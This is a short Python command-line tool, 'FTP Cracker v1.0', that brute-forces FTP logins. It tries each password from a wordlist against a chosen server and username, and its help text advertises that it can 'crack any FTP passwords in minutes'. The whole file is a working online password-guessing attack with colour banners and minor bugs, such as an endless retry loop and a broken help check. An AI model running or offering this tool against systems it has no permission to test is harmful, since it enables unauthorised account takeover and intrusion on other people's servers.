#!/usr/bin/env python3

import os
import sys
import argparse
import ftplib

parser = argparse.ArgumentParser()
parser.add_argument('-s', help='specify server IP', dest='server')
parser.add_argument('-u', help='specify user', dest='user')
parser.add_argument('-p', help='specify password file', dest='passfile')
args = parser.parse_args()

server = args.server
user = args.user
passfile = args.passfile

def crack(server, user, passfile):
	while True:
		try:
			pass_file = open(passfile)
			pass_file.close()
		except:
			print ("Password file does not found.")
			quit('')
				
		pass_file = open(passfile)
		for password in pass_file:
			try:
				print ("\033[32mtrying:", password)
				password = password.strip()
				ftp = ftplib.FTP(server)
				if ftp.login(user, password):
					print ("\033[1;32mPassword found:", password)
					quit('')
					break
			except Exception as error:
				print ('\033[31m530 Login incorrect')
		pass_file.close()

def clear():
	os.system("clear")

def help():
	print("Crack any FTP passwords in minutes")
	print('''usage: crack.py [-h] [-s SERVER] [-u USER] [-p PASSFILE]

optional arguments:
  -h, --help   show this help message and exit
  -s SERVER    specify server IP
  -u USER      specify user
  -p PASSFILE  specify password file
	''')
def banner():
	print('''\033[1;36m ______ _______ _____   _____ _____            _____ _  ________ _____  
|  ____|__   __|  __ \ / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
| |__     | |  | |__) | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
|  __|    | |  |  ___/| |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
| |       | |  | |    | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
|_|       |_|  |_|     \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ v1.0\033[0m
		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m
''')

clear()
banner()
crack(server, user, passfile)

if sys.argv[0] == "-h":
	help()